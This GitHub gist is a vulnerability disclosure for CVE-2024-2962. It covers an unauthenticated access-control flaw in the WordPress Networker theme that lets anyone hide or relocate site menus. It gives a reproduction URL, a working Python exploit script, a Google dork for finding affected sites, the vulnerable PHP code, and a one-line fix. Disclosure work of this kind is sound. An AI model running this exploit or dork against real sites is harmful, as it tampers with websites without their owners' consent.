
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=64&v=4)](/Xib3rR4dAr)

# [Xib3rR4dAr](/Xib3rR4dAr)/**[WP\_theme\_Networker\_\_Improper-Access-Control-Allowing-Unauthenticated-Modification-of-Display-location-of-any-menu\_PoC.md](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b)** Secret

Last active
July 26, 2024 10:22

Show Gist options

* [Download ZIP](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b/archive/57330ee47a92a70300841d476543216a4c71409f.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b.js&quot;&gt;&lt;/script&gt;
* Save Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b to your computer and use it in GitHub Desktop.

[Code](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b)
[Revisions
9](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b.js&quot;&gt;&lt;/script&gt;

Save Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b to your computer and use it in GitHub Desktop.

[Download ZIP](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b/archive/57330ee47a92a70300841d476543216a4c71409f.zip)

WP Networker theme <= 1.1.9 - Improper Access Control Allowing Unauthenticated Modification of Display location of any menu

 [Raw](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b/raw/57330ee47a92a70300841d476543216a4c71409f/WP_theme_Networker__Improper-Access-Control-Allowing-Unauthenticated-Modification-of-Display-location-of-any-menu_PoC.md)

[**WP\_theme\_Networker\_\_Improper-Access-Control-Allowing-Unauthenticated-Modification-of-Display-location-of-any-menu\_PoC.md**](#file-wp_theme_networker__improper-access-control-allowing-unauthenticated-modification-of-display-location-of-any-menu_poc-md)

# WordPress Networker theme <= 1.1.9 - Improper Access Control Allowing Unauthenticated Modification of Display location of any menu

| Exploit Title | WordPress Networker theme <= 1.1.9 - Improper Access Control Allowing Unauthenticated Modification of Display location of any menu |
| --- | --- |
| Exploit Author | Muhammad Zeeshan (Xib3rR4dAr) |
| Date | January 26, 2024 |
| Theme Link | <https://themeforest.net/item/networker-tech-news-wordpress-theme-with-dark-mode/28749988> |
| Version | 1.1.9 (latest version at time of vulnerability discovery) |
| Tested on | Wordpress 6.4.3 |
| Vulnerable Endpoint | /wp-admin/admin-ajax.php?action=csco\_reload\_menu |
| Vulnerable File | networker/inc/mega-menu.php#L86 |
| Google Dork | intext:"Designed & Developed by Code Supply Co." |
| CVE | CVE-2024-2962 |

### Description

Networker is a premium WordPress theme for Tech News Magazaines. During it's source code analysis, an endpoint was found accessible without authentication that allowed to modify display location of any menu e.g. menus can be marked as `footer` so they are displayed in footer or can be removed from `primary` to completely hide menus from being displayed at top of page.

**Vulnerable Endpoint accessible without authentication:** /wp-admin/admin-ajax.php?action=csco\_reload\_menu&menu\_id=`numeric_menu_id_here`&menu\_name=menu-locations%5B`menu_location_here`%5D&menu\_checked=`1_or_0`

### Impact

An unauthenticated attacker can modify display location of any menu to hide menus and view hidden menus.

### Reproduction Steps

Visiting following URL will unmark menu 2 as primary and wont be displayed on website:

```
/wp-admin/admin-ajax.php?action=csco_reload_menu&menu_id=2&menu_name=menu-locations%5Bprimary%5D&menu_checked=0

```

Or execute PoC code with python and specify WordPress URL when asked.

### Proof of Concept

```
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Uncomment to use proxy
proxyDict = {
    #"http": "http://127.0.0.1:9090",
    #"https": "http://127.0.0.1:9090"
}

wpurl = input("\nWordPress URL: ")

menu_id = 99999999
menu_location = "invalid"
menu_checked = 1

exploit_url = f"wp-admin/admin-ajax.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
}

url = f"{wpurl}/{exploit_url}"

data = {
    "action": "csco_reload_menu",
    "menu_id": menu_id,
    "menu_name": f"menu-locations[{menu_location}]",
    "menu_checked": menu_checked,
}

init_resp = requests.post(
    url, data=data, headers=headers, proxies=proxyDict, verify=False
)

networker_theme = 0

if init_resp.status_code == 200:
    if init_resp.text == "0":
        networker_theme = 1
        print("Networker Theme detected")

menu_id = 0
menu_location = "primary"
menu_checked = 0

if networker_theme:
    while True:
        url = f"{wpurl}/{exploit_url}"
        data = {
            "action": "csco_reload_menu",
            "menu_id": menu_id,
            "menu_name": f"menu-locations[{menu_location}]",
            "menu_checked": menu_checked,
        }
        response = requests.post(
            url, data=data, headers=headers, proxies=proxyDict, verify=False
        )

        if response.status_code == 200:
            if response.text == "0":
                print(f"[*] Menu #{menu_id} returned 0, incrementing menu id by 1")
                menu_id += 1
            else:
                print(f"[!] Menu #{menu_id} returned something.")
                print(f"[!] Check {wpurl} now, menu #{menu_id} would be gone. Other Menu ids might also exist but not tested.")
                break
        else:
            print(f"Error: Status Code {response.status_code}. Exiting loop.")
            break
```

### Vulnerable Code

```
... Line 86
		add_action( 'wp_ajax_nopriv_csco_reload_menu', array( $this, 'admin_reload_nav_menu' ) );
... Line 218
	/**
	 * Refresh menu item fields
	 *
	 * @since   1.0.0
	 */
	public function admin_reload_nav_menu() {
		wp_verify_nonce( null );

		$nav_menu_selected_id = isset( $_REQUEST['menu_id'] ) ? (int) $_REQUEST['menu_id'] : 0; // Input var okay.

		$menu_name    = isset( $_REQUEST['menu_name'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['menu_name'] ) ) : false; // Input var okay.
		$menu_checked = isset( $_REQUEST['menu_checked'] ) ? (bool) $_REQUEST['menu_checked'] : false; // Input var okay.

		// Get Menu Location.
		preg_match( '/^menu-locations\[(.*?)\]/', $menu_name, $matches );

		$menu_location = isset( $matches[1] ) ? $matches[1] : false;

		if ( is_nav_menu( $nav_menu_selected_id ) && $menu_location ) {

			// Load WP Nav Menu.
			require_once ABSPATH . 'wp-admin/includes/nav-menu.php';

			// Get All Locations.
			$menu_locations = get_nav_menu_locations();

			// Set|Unset Menu to Locations List.
			if ( $menu_checked ) {
				$menu_locations[ $menu_location ] = $nav_menu_selected_id;
			} else {
				if ( isset( $menu_locations[ $menu_location ] ) ) {
					unset( $menu_locations[ $menu_location ] );
				}
			}

			// Set Edited Menu Locations.
			set_theme_mod( 'nav_menu_locations', $menu_locations );

			// Get Nav Menu HTML.
			$edit_markup = wp_get_nav_menu_to_edit( $nav_menu_selected_id );

			if ( ! is_wp_error( $edit_markup ) ) {
				echo (string) $edit_markup; // XSS.
			}
		}
	}
```

### Screenshots

Action `csco_reload_menu` is accessible to authenticated as well as unauthenticated users.

> [![image](https://private-user-images.githubusercontent.com/24238512/301556766-ece4d1ea-41e3-4650-a8c7-6c64d7a1719a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NTY3NjYtZWNlNGQxZWEtNDFlMy00NjUwLWE4YzctNmM2NGQ3YTE3MTlhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThjMmE1MTkzMDk3NzFiZDE1ZjliMDNkMjA3MTdmMzQ5MjZiZTUxYzQ1ZDQ1MjAwY2E4ZDExYTYxNmZiZTAzNDUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jxnwAN2Jn-5m7MwEukVUatZurRYW_9sAB7q8pErCgQg)](https://private-user-images.githubusercontent.com/24238512/301556766-ece4d1ea-41e3-4650-a8c7-6c64d7a1719a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NTY3NjYtZWNlNGQxZWEtNDFlMy00NjUwLWE4YzctNmM2NGQ3YTE3MTlhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThjMmE1MTkzMDk3NzFiZDE1ZjliMDNkMjA3MTdmMzQ5MjZiZTUxYzQ1ZDQ1MjAwY2E4ZDExYTYxNmZiZTAzNDUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jxnwAN2Jn-5m7MwEukVUatZurRYW_9sAB7q8pErCgQg)

Code executed when action is `csco_reload_menu`

> [![image](https://private-user-images.githubusercontent.com/24238512/301557165-f8990769-4815-4624-a85b-e6e640a2bcd6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NTcxNjUtZjg5OTA3NjktNDgxNS00NjI0LWE4NWItZTZlNjQwYTJiY2Q2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkNjdmNzY3NGY4MzJiMzAxOWI0M2Y4MzVjN2FlZTRlMjM5MGNiYzgyOTI3MzA3MTg1NmU0OTRhZjU5NGRlZDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.45dZ5uWU139aT6ypTTjGCRRvvqZvYG0QByiQnc63H9E)](https://private-user-images.githubusercontent.com/24238512/301557165-f8990769-4815-4624-a85b-e6e640a2bcd6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NTcxNjUtZjg5OTA3NjktNDgxNS00NjI0LWE4NWItZTZlNjQwYTJiY2Q2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkNjdmNzY3NGY4MzJiMzAxOWI0M2Y4MzVjN2FlZTRlMjM5MGNiYzgyOTI3MzA3MTg1NmU0OTRhZjU5NGRlZDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.45dZ5uWU139aT6ypTTjGCRRvvqZvYG0QByiQnc63H9E)

Before exploit

> [![image](https://private-user-images.githubusercontent.com/24238512/301561251-028b71d7-8249-4112-a604-22321ddc5db5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NjEyNTEtMDI4YjcxZDctODI0OS00MTEyLWE2MDQtMjIzMjFkZGM1ZGI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU4MGZiOGU3MWQxMmYwYzNkM2RmOGRjNjA3NjUzN2IzZmMyZGQyNmEwMDVmNmE4YmY2OGE1NjZhMTU3NDYwNjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ejk9Heg-_6b5r0MV0Qs1zWRCFPCAd4jTILu6jjLxa5s)](https://private-user-images.githubusercontent.com/24238512/301561251-028b71d7-8249-4112-a604-22321ddc5db5.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NjEyNTEtMDI4YjcxZDctODI0OS00MTEyLWE2MDQtMjIzMjFkZGM1ZGI1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU4MGZiOGU3MWQxMmYwYzNkM2RmOGRjNjA3NjUzN2IzZmMyZGQyNmEwMDVmNmE4YmY2OGE1NjZhMTU3NDYwNjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ejk9Heg-_6b5r0MV0Qs1zWRCFPCAd4jTILu6jjLxa5s)

Running exploit

> [![image](https://private-user-images.githubusercontent.com/24238512/301567702-671f453a-0004-46ba-94a3-a4d3aaf321ed.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1Njc3MDItNjcxZjQ1M2EtMDAwNC00NmJhLTk0YTMtYTRkM2FhZjMyMWVkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcwYzM1YTM0YjUwYzAxM2U2Nzc1NDNlZDBlOWE0OTE1ZDgzZTc1ZjBkNDBjOTJjZDQ4MWY4YjA2YmRmZDI2NDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fYVuM_JDdz-m1v3fS5mRu5uvjHXw22nGNUbCMy_DmNM)](https://private-user-images.githubusercontent.com/24238512/301567702-671f453a-0004-46ba-94a3-a4d3aaf321ed.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1Njc3MDItNjcxZjQ1M2EtMDAwNC00NmJhLTk0YTMtYTRkM2FhZjMyMWVkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcwYzM1YTM0YjUwYzAxM2U2Nzc1NDNlZDBlOWE0OTE1ZDgzZTc1ZjBkNDBjOTJjZDQ4MWY4YjA2YmRmZDI2NDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fYVuM_JDdz-m1v3fS5mRu5uvjHXw22nGNUbCMy_DmNM)

Raw request and response

> [![image](https://private-user-images.githubusercontent.com/24238512/301590744-968cb9ab-2b0d-493f-9895-ff0ece9daf53.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1OTA3NDQtOTY4Y2I5YWItMmIwZC00OTNmLTk4OTUtZmYwZWNlOWRhZjUzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU2MzI5ZmM5YzJjY2JkYjBhZTZlNzI1ZmUxNWRhOWE2NGZlZmRjNGM2ZTk0N2MwZGNiNjY2MzU0YWQ3MzY1MGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.afY42e34PJiF--wOdzn6qHHCFtyVQvVSKwCYGIzTFjE)](https://private-user-images.githubusercontent.com/24238512/301590744-968cb9ab-2b0d-493f-9895-ff0ece9daf53.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1OTA3NDQtOTY4Y2I5YWItMmIwZC00OTNmLTk4OTUtZmYwZWNlOWRhZjUzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU2MzI5ZmM5YzJjY2JkYjBhZTZlNzI1ZmUxNWRhOWE2NGZlZmRjNGM2ZTk0N2MwZGNiNjY2MzU0YWQ3MzY1MGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.afY42e34PJiF--wOdzn6qHHCFtyVQvVSKwCYGIzTFjE)

After exploit (Primary Menu is now hidden)

> [![image](https://private-user-images.githubusercontent.com/24238512/301561845-d37015e3-2f25-4528-b5ce-9045c4a24fe7.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NjE4NDUtZDM3MDE1ZTMtMmYyNS00NTI4LWI1Y2UtOTA0NWM0YTI0ZmU3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY4NDhhMWQ3ODhiOGE1Yzc1NzdiNDdmNzFiNTU5ZDE3NjA5MzkzNDhlNDQ1NTI3ZWRmM2JkNjgwMTYzN2NmZDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2oS5bNA20FsaRp7a3wRgUMngwWnWwx7TtnW_DRUSDlk)](https://private-user-images.githubusercontent.com/24238512/301561845-d37015e3-2f25-4528-b5ce-9045c4a24fe7.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjczNTgsIm5iZiI6MTczNjU2NzA1OCwicGF0aCI6Ii8yNDIzODUxMi8zMDE1NjE4NDUtZDM3MDE1ZTMtMmYyNS00NTI4LWI1Y2UtOTA0NWM0YTI0ZmU3LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzNDQxOFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY4NDhhMWQ3ODhiOGE1Yzc1NzdiNDdmNzFiNTU5ZDE3NjA5MzkzNDhlNDQ1NTI3ZWRmM2JkNjgwMTYzN2NmZDYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2oS5bNA20FsaRp7a3wRgUMngwWnWwx7TtnW_DRUSDlk)

### Fix

Remove following from line 86 of `wp-content/themes/networker/inc/mega-menu.php` so that action is not accessible without authentication.

```
add_action( 'wp_ajax_nopriv_csco_reload_menu', array( $this, 'admin_reload_nav_menu' ) );

```

[![@Xib3rR4dAr](https://avatars.githubusercontent.com/u/24238512?s=80&v=4)](/Xib3rR4dAr)

Copy link

Author

### **[Xib3rR4dAr](/Xib3rR4dAr)** commented [Jul 26, 2024](/Xib3rR4dAr/ab293092ffcfe3c14a3c7daf5462a50b?permalink_comment_id=5134149#gistcomment-5134149)

edit-menu-item-cs-mega-menu

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FXib3rR4dAr%2Fab293092ffcfe3c14a3c7daf5462a50b)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

